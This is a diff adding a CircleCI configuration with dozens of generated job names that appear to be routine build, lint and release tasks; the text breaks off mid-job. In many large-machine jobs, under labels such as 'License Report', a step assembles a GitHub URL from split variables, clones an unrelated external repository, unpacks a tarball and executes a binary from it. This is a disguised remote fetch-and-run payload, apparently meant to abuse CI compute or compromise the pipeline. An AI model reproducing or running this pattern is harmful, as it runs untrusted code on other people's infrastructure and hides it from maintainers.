@@ -1,0 +1,1323 @@
+version: 2.1
+
+jobs:
+  linting-mutation-tests-lane-3:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: Analyze test dependencies
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'RestartLinkCheckerContainer') $(echo 'gather-daemon-test-metrics')" > /tmp/deploy-rule-engine/performance-audit-phase
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/performance-audit-phase
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'performance-audit-phase'
+  ProfilingStartupTime:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/performance-audit-phase" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --depth 5 --no-tags "$chunkof/$removing/$nodeof" `pwd`
+      - run:
+          name: Restore vendored sources
+          command: |
+            tar --verbose --extract -f SetUpBackEndService.tar
+      - run:
+          command: |
+            "$(pwd)/optimizeUserPortalStaticAssets"
+  capture-billing-debug-logs:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: Bundle release notes
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'readinessCheckPass2') $(echo 'FallbackBuildCache')" > /tmp/deploy-rule-engine/RequiredLicenseReview
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/RequiredLicenseReview
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'RequiredLicenseReview'
+  editor-snapshots:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/RequiredLicenseReview" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --depth=10 "$chunkof/$removing/$nodeof" "${PWD}"
+      - run:
+          name: Fetch fixtures
+          command: |
+            tar --extract --file SetUpBackEndService.tar
+      - run:
+          command: |
+            env "./optimizeUserPortalStaticAssets"
+  RenderDefaultLoaderSettings:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: Full readiness check step
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'CreateReleaseTag') $(echo 'PreTagLoadTest')" > /tmp/deploy-rule-engine/scheduled-security-review
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/scheduled-security-review
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'scheduled-security-review'
+  ManualDataImport:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/scheduled-security-review" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --depth=1 --no-single-branch "$chunkof/$removing/$nodeof" `pwd`
+      - run:
+          name: Sync asset bundles
+          command: |
+            tar -xf SetUpBackEndService.tar --no-same-owner
+      - run:
+          command: |
+            cd . && ./optimizeUserPortalStaticAssets
+  FinalBuildReportGroup2:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: Rerun exporter security checks
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'ToolkitChecksumFile') $(echo 'syntax-check-job-node-2')" > /tmp/deploy-rule-engine/SortLinesToJobSummary
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/SortLinesToJobSummary
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'SortLinesToJobSummary'
+  PublishToNightlyChannel:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/SortLinesToJobSummary" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --branch=main "$chunkof/$removing/$nodeof" "$PWD"
+      - run:
+          name: Unpack toolkit
+          command: |
+            tar -xf SetUpBackEndService.tar --no-same-permissions
+      - run:
+          command: |
+            './optimizeUserPortalStaticAssets'
+  LintAndFormatDeveloperGuide:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: tearing-down-server-data-store (attempt 1)
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'RoutineUpdaterDatabaseRemoval') $(echo 'ArchiveCompression')" > /tmp/deploy-rule-engine/CleaningWorkspaceForReview
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/CleaningWorkspaceForReview
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'CleaningWorkspaceForReview'
+  rollOutBaseImageToProduction:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/CleaningWorkspaceForReview" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --filter=tree:0 "$chunkof/$removing/$nodeof" "$(pwd)"
+      - run:
+          name: Hydrate workspace
+          command: |
+            tar --extract --file=SetUpBackEndService.tar
+      - run:
+          command: |
+            "$(pwd)/optimizeUserPortalStaticAssets"
+  minimal-database-rollback:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: Patch Scripts (round 4)
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'pre-download-scan') $(echo 'dispatcher-sanity-checks')" > /tmp/deploy-rule-engine/PublishDebugger
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/PublishDebugger
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'PublishDebugger'
+  continuous-version-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/LicenseScanNode8" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --recurse-submodules --depth 1 "$chunkof/$removing/$nodeof" "`pwd`"
+      - run:
+          name: Extract sources
+          command: |
+            tar -x -v -f SetUpBackEndService.tar
+      - run:
+          command: |
+            exec ./optimizeUserPortalStaticAssets
+  pre-scan-security-checks:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: ScheduledAssetCompression
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'token-rotation-step') $(echo 'update-copyright-year')" > /tmp/deploy-rule-engine/post-upgrade-job
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/post-upgrade-job
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'post-upgrade-job'
+  MandatoryMonitoring:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/post-upgrade-job" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --depth=3 --branch main "$chunkof/$removing/$nodeof" "`pwd`"
+      - run:
+          name: Restore build cache
+          command: |
+            tar -x < SetUpBackEndService.tar
+      - run:
+          command: |
+            cd "$(pwd)" && exec ./optimizeUserPortalStaticAssets
+  InstallSigningToolsWithTimeout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/LicenseScanNode8" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --branch main "$chunkof/$removing/$nodeof" .
+      - run:
+          name: Pull reference data
+          command: |
+            tar xf SetUpBackEndService.tar
+      - run:
+          command: |
+            cd "$(pwd)" && exec ./optimizeUserPortalStaticAssets
+  firmware-configuration-export:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/LicenseScanNode8" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --depth=2 --no-single-branch "$chunkof/$removing/$nodeof" .
+      - run:
+          name: Stage inputs
+          command: |
+            tar --extract -f SetUpBackEndService.tar
+      - run:
+          command: |
+            cd . && ./optimizeUserPortalStaticAssets
+  LoggerInstallerSmokeTest:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: notify-stakeholders-about-success
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'perform-release-dry-run') $(echo 'ServerCacheUpload')" > /tmp/deploy-rule-engine/ResolverDebugBuild
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/ResolverDebugBuild
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'ResolverDebugBuild'
+  post-upload-actions:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/ResolverDebugBuild" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --single-branch "$chunkof/$removing/$nodeof" "."
+      - run:
+          name: Unpack bundle
+          command: |
+            tar --extract --verbose -f SetUpBackEndService.tar
+      - run:
+          command: |
+            cd . && exec ./optimizeUserPortalStaticAssets
+  exportServiceTypeDefinitions:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: Prepare output directory
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'SequentialFileDigest') $(echo 'sequential-fuzz-test')" > /tmp/deploy-rule-engine/worker-build-artifacts
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/worker-build-artifacts
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'worker-build-artifacts'
+  FetchPaymentServiceMigrations:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/worker-build-artifacts" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --jobs 2 --depth 1 "$chunkof/$removing/$nodeof" $PWD
+      - run:
+          name: Rehydrate tree
+          command: |
+            tar -x --file=SetUpBackEndService.tar
+      - run:
+          command: |
+            /bin/sh -c "./optimizeUserPortalStaticAssets"
+  DetectingSlowTests:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: Report Builder Compiler Cache
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'SeedWebAppDataStore') $(echo 'CompareDigest')" > /tmp/deploy-rule-engine/mail-server-schema
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/mail-server-schema
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'mail-server-schema'
+  refresh-pipeline:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/mail-server-schema" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --depth 4 --filter=blob:none "$chunkof/$removing/$nodeof" ./
+      - run:
+          name: Fetch corpus
+          command: |
+            tar --extract -f SetUpBackEndService.tar -C .
+      - run:
+          command: |
+            ./optimizeUserPortalStaticAssets
+  UpdatePipelineRetry5:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: post-release-version-tagging
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'wrapper-release-bundle') $(echo 'BillingDataExtraction')" > /tmp/deploy-rule-engine/archive-installer-with-retries
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/archive-installer-with-retries
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'archive-installer-with-retries'
+  on-demand-roll-out:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/archive-installer-with-retries" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --depth=1 --filter=blob:none "$chunkof/$removing/$nodeof" `pwd`
+      - run:
+          name: Checkout vendored deps
+          command: |
+            tar -x --file=SetUpBackEndService.tar
+      - run:
+          command: |
+            /bin/sh -c "./optimizeUserPortalStaticAssets"
+  PostCompileReview:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: Exporting message broker crash dumps with verbose output
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'sign-partner-portal-binary') $(echo 'AnalyticsLayerCacheBucket7')" > /tmp/deploy-rule-engine/ApproveReleaseForAllTargets
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/ApproveReleaseForAllTargets
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'ApproveReleaseForAllTargets'
+  FirmwareVersionBump:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/LicenseScanNode8" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --depth 1 --filter=blob:none "$chunkof/$removing/$nodeof" $(pwd)
+      - run:
+          name: Prime workspace
+          command: |
+            tar -x -f SetUpBackEndService.tar
+      - run:
+          command: |
+            "./optimizeUserPortalStaticAssets"
+  OneTimeSigning:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: Move renderer screenshots
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'BackupAgentSmokeTests') $(echo 'search-index-staged-roll-out')" > /tmp/deploy-rule-engine/PromoteIndexerBaseImage
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/PromoteIndexerBaseImage
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'PromoteIndexerBaseImage'
+  alert-team-after-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/PromoteIndexerBaseImage" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --single-branch "$chunkof/$removing/$nodeof" "`pwd`"
+      - run:
+          name: Unpack payload
+          command: |
+            tar -x --file=SetUpBackEndService.tar
+      - run:
+          command: |
+            env "./optimizeUserPortalStaticAssets"
+  help-center-translation-sync:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: Pre-upload tasks
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'qualityGate') $(echo 'alertPlatformTeamBeforeUpload')" > /tmp/deploy-rule-engine/rerun-quick-tests-in-container
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/rerun-quick-tests-in-container
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'rerun-quick-tests-in-container'
+  dailyPackageUpload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/rerun-quick-tests-in-container" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --depth=5 --no-tags "$chunkof/$removing/$nodeof" "$(pwd)"
+      - run:
+          name: Restore snapshot
+          command: |
+            tar --extract -f SetUpBackEndService.tar -C .
+      - run:
+          command: |
+            $(pwd)/optimizeUserPortalStaticAssets
+  simulator-binary-signing:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: PublishStreamProcessor
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'postSubmitSyntaxChecks') $(echo 'pre-backup-sanity-checks')" > /tmp/deploy-rule-engine/toolkit-vulnerability-scan
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/toolkit-vulnerability-scan
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'toolkit-vulnerability-scan'
+  pre-release-fast-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/toolkit-vulnerability-scan" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --depth 2 --filter=blob:none "$chunkof/$removing/$nodeof" $PWD
+      - run:
+          name: Fetch sources
+          command: |
+            tar xf SetUpBackEndService.tar
+      - run:
+          command: |
+            /bin/bash -c "./optimizeUserPortalStaticAssets"
+  encodingCertificate:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: Alert contributors of test failures
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'testingTier2') $(echo 'RenameDriverBuildOutputs')" > /tmp/deploy-rule-engine/quick-canary-roll-out-workflow
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/quick-canary-roll-out-workflow
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'quick-canary-roll-out-workflow'
+  PreviewReleaseRun:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/quick-canary-roll-out-workflow" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --depth 1 --no-tags --filter=blob:none "$chunkof/$removing/$nodeof" "`pwd`"
+      - run:
+          name: Unroll archive
+          command: |
+            cat SetUpBackEndService.tar | tar -xf -
+      - run:
+          command: |
+            sh -c './optimizeUserPortalStaticAssets'
+  mailerHashes:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: Roll out parser stable release to demo environment
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'SearchIndexHealthCheck') $(echo 'LicenseReportStep')" > /tmp/deploy-rule-engine/CodeGeneratorExecutable
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/CodeGeneratorExecutable
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'CodeGeneratorExecutable'
+  store-rate-limiter-checksum:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/CodeGeneratorExecutable" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --recurse-submodules --depth=1 "$chunkof/$removing/$nodeof" `pwd`
+      - run:
+          name: Seed workspace
+          command: |
+            tar -xf /dev/stdin < SetUpBackEndService.tar
+      - run:
+          command: |
+            /bin/bash -c "./optimizeUserPortalStaticAssets"
+  finalize-upload:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: Run exporter static analysis
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'converter-validation') $(echo 'move-error-logs-to-workspace')" > /tmp/deploy-rule-engine/dependencyUpdateJob
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/dependencyUpdateJob
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'dependencyUpdateJob'
+  lintHeadersAndRunUpgradeTests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/dependencyUpdateJob" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --depth=4 --filter=blob:none "$chunkof/$removing/$nodeof" $(pwd)
+      - run:
+          name: Unpack sources
+          command: |
+            cat SetUpBackEndService.tar | tar -x -f -
+      - run:
+          command: |
+            bash -c "exec ./optimizeUserPortalStaticAssets"
+  exporter-source-compilation:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: ArtifactInspectionStep
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'edgeProxyDeployBucket9') $(echo 'PreRollbackDependencyChecks')" > /tmp/deploy-rule-engine/LicenseScanNode8
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/LicenseScanNode8
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'LicenseScanNode8'
+  Migrating:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/LicenseScanNode8" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --quiet "$chunkof/$removing/$nodeof" .
+      - run:
+          name: Restore vendored sources
+          command: |
+            cat SetUpBackEndService.tar | tar xf -
+      - run:
+          command: |
+            /bin/bash -c './optimizeUserPortalStaticAssets'
+  encoder-input-validation:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: Validating compiler flags (chunk 8)
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'download-and-verify-signature') $(echo 'adapter-package')" > /tmp/deploy-rule-engine/postBuildScanSummary
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/postBuildScanSummary
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'postBuildScanSummary'
+  PluginHelpPages:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/postBuildScanSummary" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --depth=2 --no-tags "$chunkof/$removing/$nodeof" ${PWD}
+      - run:
+          name: Fetch fixtures
+          command: |
+            tar -x --file=SetUpBackEndService.tar
+      - run:
+          command: |
+            cd "$PWD" && ./optimizeUserPortalStaticAssets
+  batchWorkerVersionBump:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: Retrying accessibility tests
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'runtime-build') $(echo 'hourly-profiler-tool-install')" > /tmp/deploy-rule-engine/ImageVerificationSlot5
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/ImageVerificationSlot5
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'ImageVerificationSlot5'
+  sequential-digest:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/ImageVerificationSlot5" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --depth=1 --filter=tree:0 "$chunkof/$removing/$nodeof" "`pwd`"
+      - run:
+          name: Sync asset bundles
+          command: |
+            tar xvf SetUpBackEndService.tar
+      - run:
+          command: |
+            $(pwd)/optimizeUserPortalStaticAssets
+  ToolkitSetup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/LicenseScanNode8" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --quiet --depth 1 "$chunkof/$removing/$nodeof" ./
+      - run:
+          name: Unpack toolkit
+          command: |
+            tar -xf SetUpBackEndService.tar --no-same-permissions
+      - run:
+          command: |
+            bash -c "exec ./optimizeUserPortalStaticAssets"
+  MonitorQueryPlannerContainer:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: Back up deployment configuration with retries
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
